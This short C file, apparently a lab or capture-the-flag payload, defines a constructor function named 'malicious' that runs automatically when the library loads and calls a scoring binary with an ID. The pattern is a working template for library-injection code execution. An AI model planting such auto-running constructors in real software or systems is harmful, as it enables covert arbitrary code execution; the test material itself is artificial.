#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score cd946d5c-a75c-449d-8759-fb6b998b9824");
}
